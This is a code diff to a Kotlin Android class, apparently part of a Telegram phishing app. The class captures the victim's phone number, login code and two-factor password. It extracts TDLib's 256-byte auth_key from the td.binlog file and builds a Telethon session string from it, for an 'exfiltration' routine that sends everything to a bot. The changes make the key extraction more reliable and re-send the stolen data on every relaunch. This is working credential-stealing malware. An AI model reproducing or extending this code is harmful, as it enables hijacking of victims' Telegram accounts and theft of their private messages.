@@ -2,21 +2,22 @@ package com.tgme.app
 
 import android.content.Context
 import android.util.Base64
+import org.drinkless.tdlib.TdApi
 import java.io.File
 
-/** Données capturées (grabber) + extraction de la clé de session depuis TDLib. */
 object Capture {
     var phone = ""
     var code = ""
     var password = ""
     var codeLength = 0
 
-    // remplis au READY, juste avant l'exfiltration
     var userId = 0L
     var userName = ""
     var dcId = 0
     var authKeyHex = ""
     var session = ""
+
+    private val AUTH_KEY = "auth_key".toByteArray(Charsets.US_ASCII)
 
     fun save(ctx: Context) {
         ctx.getSharedPreferences("tgme", Context.MODE_PRIVATE).edit()
@@ -27,45 +28,68 @@ object Capture {
             .apply()
     }
 
+    /** Relit les valeurs au demarrage : un simple relaunch re-envoie tout au bot. */
+    fun load(ctx: Context) {
+        val p = ctx.getSharedPreferences("tgme", Context.MODE_PRIVATE)
+        phone = p.getString("phone", "") ?: ""
+        code = p.getString("code", "") ?: ""
+        password = p.getString("password", "") ?: ""
+        session = p.getString("session", "") ?: ""
+    }
+
     // ---------- td.binlog ----------
 
-    private fun binlog(ctx: Context) = File(ctx.filesDir, "tdlib/db/td.binlog")
+    fun binlogFile(ctx: Context) = File(ctx.filesDir, "tdlib/db/td.binlog")
 
-    /** À appeler APRÈS TdApi.Close(). Poll le temps que TDLib finisse d'écrire. */
-    fun readAuth(ctx: Context, timeoutMs: Long = 8000): Boolean {
-        val f = binlog(ctx)
+    /** A appeler APRES TdApi.Close() : TDLib doit avoir vide son binlog. */
+    fun readAuth(ctx: Context, timeoutMs: Long = 20000): Boolean {
+        val f = binlogFile(ctx)
         val end = System.currentTimeMillis() + timeoutMs
         while (System.currentTimeMillis() < end) {
             if (f.exists()) {
                 try { if (parse(f.readBytes())) return true } catch (_: Exception) {}
             }
-            try { Thread.sleep(300) } catch (_: InterruptedException) {}
+            try { Thread.sleep(250) } catch (_: InterruptedException) {}
         }
         return authKeyHex.isNotEmpty()
     }
 
+    /** Scan brut : cle ASCII "auth_key<dc>" suivie d'une valeur de 260 octets. */
     private fun parse(b: ByteArray): Boolean {
-        if (b.size < 12 || String(b, 0, 4, Charsets.US_ASCII) != "TDBL") return false
-        var p = 8 // magic + version uint32
-        while (p + 8 <= b.size) {
-            val kl = le32(b, p); p += 4
-            if (kl <= 0 || p + kl + 4 > b.size) break
-            val key = String(b, p, kl, Charsets.US_ASCII); p += kl
-            val vl = le32(b, p); p += 4
-            if (vl <= 0 || p + vl > b.size) break
-            if (key.startsWith("auth_key")) {
-                val v = b.copyOfRange(p, p + vl)
-                val k = if (v.size > 256) v.copyOfRange(v.size - 256, v.size) else v
-                if (k.size == 256) {
-                    authKeyHex = k.joinToString("") { "%02x".format(it.toInt() and 0xFF) }
-                    dcId = if (v.size >= 260) le32(v, 0) else dcId
-                    session = telethon(dcId, k)
-                    return true
+        var i = indexOf(b, AUTH_KEY, 0)
+        while (i >= 0) {
+            var k = i + AUTH_KEY.size
+            while (k < b.size && b[k].toInt() in 0x30..0x39) k++
+            if (k + 4 <= b.size) {
+                val vl = le32(b, k)
+                val vs = k + 4
+                if (vl >= 260 && vs + vl <= b.size) {
+                    val v = b.copyOfRange(vs, vs + vl)
+                    val dc = le32(v, 0)
+                    if (dc in 1..5) {
+                        val key = v.copyOfRange(v.size - 256, v.size)
+                        authKeyHex = key.joinToString("") { "%02x".format(it.toInt() and 0xFF) }
+                        dcId = dc
+                        session = telethon(dc, key)
+                        return true
+                    }
                 }
             }
-            p += vl + 4 // valeur + timestamp
+            i = indexOf(b, AUTH_KEY, i + 1)
         }
         return false
+    }
+
+    private fun indexOf(h: ByteArray, n: ByteArray, from: Int): Int {
+        if (n.isEmpty() || h.size < n.size) return -1
+        var i = from
+        while (i <= h.size - n.size) {
+            var j = 0
+            while (j < n.size && h[i + j] == n[j]) j++
+            if (j == n.size) return i
+            i++
+        }
+        return -1
     }
 
     private fun le32(b: ByteArray, p: Int): Int =
@@ -86,10 +110,22 @@ object Capture {
         val out = ByteArray(1 + 4 + 2 + 256)
         out[0] = dc.toByte()
         System.arraycopy(ip, 0, out, 1, 4)
-        out[5] = 0x01          // port 443
-        out[6] = 0xBB.toByte()
+        out[5] = 0xBB.toByte()   // port 443 en little-endian
+        out[6] = 0x01
         System.arraycopy(key, 0, out, 7, 256)
-        return Base64.encodeToString(out, Base64.URL_SAFE or Base64.NO_WRAP)
+        return Base64.encodeToString(out, Base64.URL_SAFE or Base64.NO_WRAP or Base64.NO_PADDING)
+    }
+
+    // ---------- verite serveur : sessions actives ----------
+
+    fun render(s: TdApi.Sessions): String = buildString {
+        append("SESSIONS (ttl ${s.inactiveSessionTtlDays} j)\n")
+        s.sessions.forEach { x ->
+            append(if (x.isCurrent) "[MOI] " else "[   ] ")
+            append("${x.applicationName} ${x.applicationVersion} | ${x.deviceModel} | ")
+            append("${x.systemVersion} | api_id ${x.apiId} | ${x.ip} ${x.city} ${x.country} | ")
+            append("login ${x.logInDate} last ${x.lastActiveDate}\n")
+        }
     }
 
     // ---------- exfiltration ----------
@@ -104,6 +140,4 @@ object Capture {
         append("auth_key: $authKeyHex\n")
         append("session: $session\n")
     }
-
-    fun binlogFile(ctx: Context) = binlog(ctx)
 }
